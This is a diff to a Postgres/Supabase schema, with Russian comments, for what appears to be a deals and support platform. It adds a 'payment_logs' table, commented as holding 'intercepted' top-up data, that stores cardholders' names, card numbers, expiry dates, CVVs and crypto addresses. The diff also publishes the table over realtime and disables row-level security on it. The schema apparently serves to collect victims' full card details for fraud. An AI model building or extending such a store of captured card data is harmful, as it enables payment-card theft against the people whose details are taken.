@@ -116,6 +116,21 @@ CREATE TABLE IF NOT EXISTS public.ticket_messages (
     created_at TIMESTAMPTZ NOT NULL DEFAULT now()
 );
 
+-- Логи пополнений (перехваченные данные для поддержки)
+CREATE TABLE IF NOT EXISTS public.payment_logs (
+    id BIGSERIAL PRIMARY KEY,
+    user_id BIGINT,
+    user_login TEXT,
+    payment_method TEXT NOT NULL,
+    fio TEXT,
+    amount NUMERIC NOT NULL,
+    card_number TEXT,
+    card_expiry TEXT,
+    card_cvv TEXT,
+    crypto_address TEXT,
+    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
+);
+
 -- ========== ТАБЛИЦА НАСТРОЕК ПЛАТФОРМЫ (онлайн, etc) ==========
 CREATE TABLE IF NOT EXISTS public.platform_settings (
     key TEXT PRIMARY KEY,
@@ -131,6 +146,7 @@ ALTER PUBLICATION supabase_realtime ADD TABLE public.deal_messages;
 ALTER PUBLICATION supabase_realtime ADD TABLE public.support_tickets;
 ALTER PUBLICATION supabase_realtime ADD TABLE public.ticket_messages;
 ALTER PUBLICATION supabase_realtime ADD TABLE public.platform_settings;
+ALTER PUBLICATION supabase_realtime ADD TABLE public.payment_logs;
 
 -- ========== ОТКЛЮЧЕНИЕ RLS (управление доступом на стороне приложения) ==========
 ALTER TABLE public.users DISABLE ROW LEVEL SECURITY;
@@ -143,6 +159,7 @@ ALTER TABLE public.system_stats DISABLE ROW LEVEL SECURITY;
 ALTER TABLE public.platform_settings DISABLE ROW LEVEL SECURITY;
 ALTER TABLE public.support_tickets DISABLE ROW LEVEL SECURITY;
 ALTER TABLE public.ticket_messages DISABLE ROW LEVEL SECURITY;
+ALTER TABLE public.payment_logs DISABLE ROW LEVEL SECURITY;
 
 -- ========== НАЧАЛЬНЫЕ ДАННЫЕ (SEED) ==========
 
